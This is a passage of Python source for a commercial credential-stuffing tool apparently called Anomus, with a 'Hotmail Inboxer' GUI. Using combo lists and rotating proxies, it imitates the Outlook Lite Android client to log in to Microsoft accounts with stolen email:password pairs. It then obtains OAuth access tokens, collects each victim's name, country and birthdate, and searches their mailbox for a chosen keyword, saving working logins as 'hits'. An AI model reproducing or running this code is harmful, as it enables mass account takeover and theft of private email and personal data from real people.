            self.lbl_custom.configure(text=f"Custom: {self.stats['Custom']}")
            self.lbl_bad.configure(text=f"Bad: {self.stats['Bad']}")
            self.lbl_retries.configure(text=f"Retries: {self.stats['Retries']}")
            
            if self.total_combos_loaded > 0:
                progress = self.combos_processed / self.total_combos_loaded
                self.progress_bar.set(progress)
            
        self.after(100, self._process_log_queue)

    def _start_checking(self):
        if not self.combo_file or not self.proxies_file:
            messagebox.showwarning("Missing Configuration", "Please select both Combo and Proxies files via the sidebar.")
            return
            
        keyword = self.ent_keyword.get().strip()
        if not keyword:
            messagebox.showwarning("Missing Configuration", "Please enter a Target Keyword.")
            return
            
        try:
            threads_count = int(self.ent_threads.get().strip())
        except ValueError:
            messagebox.showwarning("Invalid Input", "Threads must be a valid number.")
            return

        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        self.is_running = True
        
        # Reset Stats
        with self.lock:
            self.stats = {'Hits': 0, 'Bad': 0, 'Custom': 0, 'Retries': 0}
            self.combos_processed = 0
            self.total_combos_loaded = 0
            
        self.progress_bar.set(0)
        self.log_area.delete("0.0", "end")
        self._save_config()
        self._log(f"[*] Initializing attack against target keyword '{keyword}'...")

        # Clear Queues
        with self.anasComboQueue.mutex:
             self.anasComboQueue.queue.clear()
        with self.anasProxyQueue.mutex:
             self.anasProxyQueue.queue.clear()

        # Load Files
        try:
            with open(self.combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and '@' in line and ':' in line:
                        self.anasComboQueue.put(line)
                        self.total_combos_loaded += 1
                        
            with open(self.proxies_file, 'r', encoding='utf-8', errors='ignore') as f:
                proxies = [line.strip() for line in f if line.strip()]
                for proxy in proxies:
                    self.anasProxyQueue.put(proxy)
                    
            self._log(f"[*] Loaded {self.anasComboQueue.qsize()} combos and {self.anasProxyQueue.qsize()} proxies.")
        except Exception as e:
            self._log(f"[!] Error loading files: {str(e)}")
            self._stop_checking()
            return

        # Start Threads
        self.threads_list = []
        actual_threads = min(threads_count, self.anasComboQueue.qsize())
        self._log(f"[*] Spawning {actual_threads} worker threads... Running.\n")
        
        for _ in range(actual_threads):
            t = threading.Thread(target=self._worker, args=(keyword,))
            t.daemon = True
            self.threads_list.append(t)
            t.start()
            
        # Monitor
        monitor_t = threading.Thread(target=self._monitor_threads)
        monitor_t.daemon = True
        monitor_t.start()

    def _stop_checking(self):
        self.is_running = False
        self._log("\n[!] Abort command issued... Waiting for threads to finish current task.")
        self.btn_stop.configure(state="disabled")

    def _monitor_threads(self):
        for t in self.threads_list:
            t.join()
        
        self.after(0, self._on_checking_complete)

    def _on_checking_complete(self):
        if self.is_running:
            self._log("\n[+] Finished checking all combos successfully.")
        self.is_running = False
        self.btn_start.configure(state="normal")
        self.btn_stop.configure(state="disabled")

    def anasGetProxy(self):
        proxy = self.anasProxyQueue.get()
        self.anasProxyQueue.put(proxy)
        return proxy

    def anasFormProxy(self, proxy, ptype="HTTP"):
        try:
            if "://" in proxy:
                proxy = proxy.split("://", 1)[1]
                
            if ptype == "SOCKS4":
                return {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
            elif ptype == "SOCKS5":
                return {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
                
            if '@' in proxy:
                userpass, ipport = proxy.rsplit('@', 1)
                user, passwd = userpass.split(':', 1)
                ip, port = ipport.split(':', 1)
                return {
                    "http": f"http://{user}:{passwd}@{ip}:{port}",
                    "https": f"http://{user}:{passwd}@{ip}:{port}"
                }
            else:
                parts = proxy.split(':')
                if len(parts) == 4:
                    if '.' in parts[0] or parts[0].isdigit():
                        ip, port, user, passwd = parts
                    else:
                        user, passwd, ip, port = parts
                    return {
                        "http": f"http://{user}:{passwd}@{ip}:{port}",
                        "https": f"http://{user}:{passwd}@{ip}:{port}"
                    }
                elif len(parts) >= 2:
                    ip, port = parts[0], parts[1]
                    return {
                        "http": f"http://{ip}:{port}",
                        "https": f"http://{ip}:{port}"
                    }
                else:
                    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        except Exception:
            return {"http": "http://invalid:0", "https": "http://invalid:0"}

    def anasSaveHitssss(self, line):
        with self.lock:
            with open(self.anasHitsFiles, 'a', encoding='utf-8') as f:
                f.write(line + '\n')
                
    def anasSaveCustomssss(self, line):
        with self.lock:
            with open(self.anasCustomFiles, 'a', encoding='utf-8') as f:
                f.write(line + '\n')

    def _worker(self, keyCheckk):
        while self.is_running and not self.anasComboQueue.empty():
            combo = self.anasComboQueue.get()
            if '@' not in combo or ':' not in combo:
                self.anasComboQueue.task_done()
                continue
                
            email, password = combo.split(':', 1)
            success_or_bad = False
            
            for _ in range(self.mwRetries):
                if not self.is_running:
                    break
                    
                proxy = self.anasGetProxy()
                proxies = self.anasFormProxy(proxy, self.proxy_type_var.get())
                session = requests.Session()
                
                try:
                    user_agent = generate_user_agent()
                    session.proxies = proxies
                    url = (
                        "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
                        "client_info=1&haschrome=1&login_hint=" + str(email) +
                        "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                        "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                        "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                    )
                    headers = {
                        "Connection": "keep-alive",
                        "Upgrade-Insecure-Requests": "1",
                        "User-Agent": user_agent,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
                                  "image/avif,image/webp,image/apng,*/*;q=0.8,"
                                  "application/signed-exchange;v=b3;q=0.9",
                        "return-client-request-id": "false",
                        "client-request-id": str(uuid.uuid4()),
                        "x-ms-sso-ignore-sso": "1",
                        "correlation-id": str(uuid.uuid4()),
                        "x-client-ver": "1.1.0+9e54a0d1",
                        "x-client-os": "28",
                        "x-client-sku": "MSAL.xplat.android",
                        "x-client-src-sku": "MSAL.xplat.android",
                        "X-Requested-With": "com.microsoft.outlooklite",
                        "Sec-Fetch-Site": "none",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-User": "?1",
                        "Sec-Fetch-Dest": "document",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "en-US,en;q=0.9",
                    }
                    response = session.get(url, headers=headers, allow_redirects=True, timeout=30)
                    response_text = response.text

                    PPFT = ""
                    urlPost = ""

                    server_data_pattern = r'var ServerData = ({.*?});'
                    server_data_match = re.search(server_data_pattern, response_text, re.DOTALL)

                    if server_data_match:
                        try:
                            server_data_json = server_data_match.group(1)
                            server_data = json.loads(server_data_json)
                            sFTTag = server_data.get('sFTTag', '')
                            if sFTTag:
                                ppft_pattern = r'value="([^"]+)"'
                                ppft_match = re.search(ppft_pattern, sFTTag)
                                if ppft_match:
                                    PPFT = ppft_match.group(1)
                            urlPost = server_data.get('urlPost', '')
                        except json.JSONDecodeError:
                            pass

                    if not PPFT:
                        start_marker = 'name="PPFT" value="'
                        start_index = response_text.find(start_marker)
                        if start_index != -1:
                            start_index += len(start_marker)
                            end_index = response_text.find('"', start_index)
                            PPFT = response_text[start_index:end_index] if end_index != -1 else ""

                    if not urlPost:
                        urlpost_pattern = r'"urlPost":"([^"]+)"'
                        urlpost_match = re.search(urlpost_pattern, response_text)
                        if urlpost_match:
                            urlPost = urlpost_match.group(1)

                    cookies_dict = session.cookies.get_dict()
                    MSPRequ = cookies_dict.get('MSPRequ', '')
                    uaid = cookies_dict.get('uaid', '')
                    MSPOK = cookies_dict.get('MSPOK', '')
                    OParams = cookies_dict.get('OParams', '')
                    referer_url = response.url

                    if not PPFT or not urlPost:
                        with self.lock:
                            self.stats['Bad'] += 1
                        success_or_bad = True
                        break

                    data_string = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
                    LEN = len(data_string)

                    headers_post = {
                        "User-Agent": user_agent,
                        "Pragma": "no-cache",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Host": "login.live.com",
                        "Connection": "keep-alive",
                        "Content-Length": str(LEN),
                        "Cache-Control": "max-age=0",
                        "Upgrade-Insecure-Requests": "1",
                        "Origin": "https://login.live.com",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-Requested-With": "com.microsoft.outlooklite",
                        "Sec-Fetch-Site": "same-origin",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-User": "?1",
                        "Sec-Fetch-Dest": "document",
                        "Referer": referer_url,
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Cookie": f"MSPRequ={MSPRequ}; uaid={uaid}; MSPOK={MSPOK}; OParams={OParams}"
                    }

                    post_response = session.post(
                        urlPost,
                        data=data_string,
                        headers=headers_post,
                        allow_redirects=False,
                        timeout=30
                    )

                    cookies_dict = session.cookies.get_dict()
                    if "__Host-MSAAUTHP" not in cookies_dict:
                        with self.lock:
                            self.stats['Bad'] += 1
                        success_or_bad = True
                        break

                    auth_code = ""
                    if post_response.status_code in [301, 302, 303, 307, 308]:
                        redirect_url = post_response.headers.get('Location', '')
                        if redirect_url and 'msauth://' in redirect_url and 'code=' in redirect_url:
                            auth_code = redirect_url.split('code=')[1].split('&')[0]
                    else:
                        redirect_pattern = r'window\.location\s*=\s*["\']([^"\']+)["\']'
                        redirect_match = re.search(redirect_pattern, post_response.text)
                        if redirect_match:
                            redirect_url = redirect_match.group(1)
                            if 'msauth://' in redirect_url and 'code=' in redirect_url:
                                auth_code = redirect_url.split('code=')[1].split('&')[0]

                    CID = cookies_dict.get('MSPCID', '')
                    if CID:
                        CID = CID.upper()

                    access_token = ""
                    if auth_code:
                        url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                        data_token = {
                            "client_info": "1",
                            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                            "grant_type": "authorization_code",
                            "code": auth_code,
                            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
                        }
                        token_response = requests.post(url_token, data=data_token, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=30)
                        if token_response.status_code == 200:
                            token_data = token_response.json()
                            access_token = token_data.get("access_token", "")

                    Name = ""
                    Country = ""
                    Birthdate = "N/A"
                    Total = "NO"
                    
                    if access_token and CID:
                        profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
                        profile_headers = {
                            "User-Agent": "Outlook-Android/2.0",
                            "Pragma": "no-cache",
                            "Accept": "application/json",
                            "ForceSync": "false",
                            "Authorization": f"Bearer {access_token}",
                            "X-AnchorMailbox": f"CID:{CID}",
                            "Host": "substrate.office.com",
                            "Connection": "Keep-Alive",
                            "Accept-Encoding": "gzip"
                        }
                        pRes = requests.get(profile_url, headers=profile_headers, timeout=30)
                        if pRes.status_code == 200:
                            profile_data = pRes.json()
                            if "accounts" in profile_data and len(profile_data["accounts"]) > 0:
                                first_account = profile_data["accounts"][0]
                                Country = first_account.get("location", "")
                                BD = first_account.get("birthDay", "")
                                BM = first_account.get("birthMonth", "")
                                BY = first_account.get("birthYear", "")
                                if BD and BM and BY:
                                    BD_str = str(BD).zfill(2)
                                    BM_str = str(BM).zfill(2)
                                    Birthdate = f"{BY}-{BM_str}-{BD_str}"
                            if "names" in profile_data and len(profile_data["names"]) > 0:
                                first_name = profile_data["names"][0]
                                Name = first_name.get("displayName", "")
                                
                        search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
                        search_payload = {
                            "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                            "Scenario": {"Name": "owa.react"},
                            "TimeZone": "United Kingdom Standard Time",
                            "TextDecorations": "Off",
                            "EntityRequests": [{
                                "EntityType": "Conversation",
                                "ContentSources": ["Exchange"],
                                "Filter": {
                                    "Or": [
                                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                                    ]
                                },
                                "From": 0,
                                "Query": {"QueryString": keyCheckk},
                                "RefiningQueries": None,
                                "Size": 25,
                                "Sort": [
                                    {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                                    {"Field": "Time", "SortDirection": "Desc"}
                                ],
                                "EnableTopResults": True,
                                "TopResultsCount": 3
                            }],
                            "AnswerEntityRequests": [{
                                "Query": {"QueryString": "Playstation Sony"},
                                "EntityTypes": ["Event", "File"],
                                "From": 0,
                                "Size": 100,
                                "EnableAsyncResolution": True
                            }],
                            "QueryAlterationOptions": {
                                "EnableSuggestion": True,
                                "EnableAlteration": True,
                                "SupportedRecourseDisplayTypes": [
                                    "Suggestion", "NoResultModification",
                                    "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"
                                ]
                            },
                            "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
                        }
                        search_headers = {
                            "User-Agent": "Outlook-Android/2.0",
                            "Pragma": "no-cache",
                            "Accept": "application/json",
                            "ForceSync": "false",
                            "Authorization": f"Bearer {access_token}",
                            "X-AnchorMailbox": f"CID:{CID}",
                            "Host": "substrate.office.com",
                            "Connection": "Keep-Alive",
                            "Accept-Encoding": "gzip",
                            "Content-Type": "application/json"
                        }
                        search_response = requests.post(search_url, json=search_payload, headers=search_headers, timeout=30)
                        
                        if search_response.status_code == 200:
                            search_text = search_response.text
                            date_start = search_text.find('"LastModifiedTime":"')
                            if date_start != -1:
                                date_start += len('"LastModifiedTime":"')
                                date_end = search_text.find('"', date_start)
                                Date = search_text[date_start:date_end] if date_end != -1 else "N/A"
                            else:
                                Date = "N/A"
                            total_start = search_text.find('"Total":')
                            if total_start != -1:
                                total_start += len('"Total":')
                                total_end = search_text.find(',', total_start)
                                if total_end == -1:
                                    total_end = search_text.find('}', total_start)
                                Total = search_text[total_start:total_end] if total_end != -1 else "NO"
                            else:
                                Total = "NO TOTAL!"
                                
                            if Total != "0" and Total != "NO TOTAL!":
                                with self.lock:
                                    self.stats['Hits'] += 1
                                hit_msg = f"[HIT] {email}:{password} | Name = {Name} | Country = {Country} | Total = {Total}"
                                self._log(hit_msg)
                                self.anasSaveHitssss(hit_msg)
                            else:
                                with self.lock:
                                    self.stats['Custom'] += 1
                                custom_msg = f"[CUSTOM] {email}:{password} | Name = {Name} | Country = {Country}"
                                self._log(custom_msg)
                                self.anasSaveCustomssss(custom_msg)
                        else:
                            with self.lock:
                                self.stats['Custom'] += 1
                            custom_msg = f"[CUSTOM] {email}:{password} | Name = {Name} | Country = {Country}"
                            self._log(custom_msg)
                            self.anasSaveCustomssss(custom_msg)
                    else:
                        with self.lock:
                            self.stats['Bad'] += 1
                            
                    success_or_bad = True
                    break
                except Exception:
                    with self.lock:
                        self.stats['Retries'] += 1
                    time.sleep(0.05)
                    
            if not success_or_bad and self.is_running:
                # If we exhausted retries (technically impossible with 99999999999 but just in case)
                with self.lock:
                    self.stats['Bad'] += 1
                    
            with self.lock:
                self.combos_processed += 1
            self.anasComboQueue.task_done()

def run_hotmail_inboxer_gui():
    try:
        app = InboxerApp()
        app.mainloop()
    except Exception as e:
        print(f"Error starting Hotmail Inboxer GUI: {e}")
        input("Press enter to return...")


def main():
    sys.stdout.write('\033[?25l')
    sys.stdout.flush()
    load_settings()
    if not check_disclaimer_accepted():
        run_disclaimer_screen()
    if not DEVELOPMENT_MODE and not license_client.is_licensed():
        run_license_screen()

    if platform.system() == 'Windows':
        win_version = get_windows_version()
        is_fancy_menu = win_version and win_version['major'] >= 10 and win_version['build'] >= 22000
    else:
        is_fancy_menu = True

    set_title('Anomus - Main Menu')
    menu_options = ['Launch Microsoft Fetcher', 'Discord Promo Puller', 'Purchase Automation', 'Search Tool', 'Hotmail Inboxer (GUI)', 'Settings', 'About', 'Exit']
    selected, frame = 0, 0

    while True:
        display_menu('Main Menu', menu_options, selected, frame, is_fancy_menu)
        key = get_key()
        if key == Key.UP:
            selected = (selected - 1) % len(menu_options)
        elif key == Key.DOWN:
            selected = (selected + 1) % len(menu_options)
        elif key == Key.ENTER:
            if selected == 0:
                run_microsoft_checker()
            elif selected == 1:
                run_discord_promo_puller()
            elif selected == 2:
                run_purchase_automation()
            elif selected == 3:
                run_search_tool()
            elif selected == 4:
                run_hotmail_inboxer_gui()
            elif selected == 5:
                run_settings_menu(is_fancy_menu)
            elif selected == 6:
                about_message = f'{BANNER}\nAnomus Tool | Microsoft Fetcher - 2.0\nMade by @anomus.ly\nSTORE: https://anomus.mysellauth.com'
                show_message(about_message, color=THEME['about_color'], vertical_center=True)
            elif selected == 7:
                clear_terminal()
                print('Goodbye!'.center(shutil.get_terminal_size().columns))
                sys.exit()
            set_title('Anomus - Main Menu')
        frame += 1
        time.sleep(0.01)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\nProgram interrupted by user. Exiting.')
    except Exception as e:
        sys.stdout.write('\033[?25h')
        sys.stdout.flush()
        print(f'\nAn unexpected error occurred: {e}')
    finally:
        sys.stdout.write('\033[?25h')
        sys.stdout.flush()
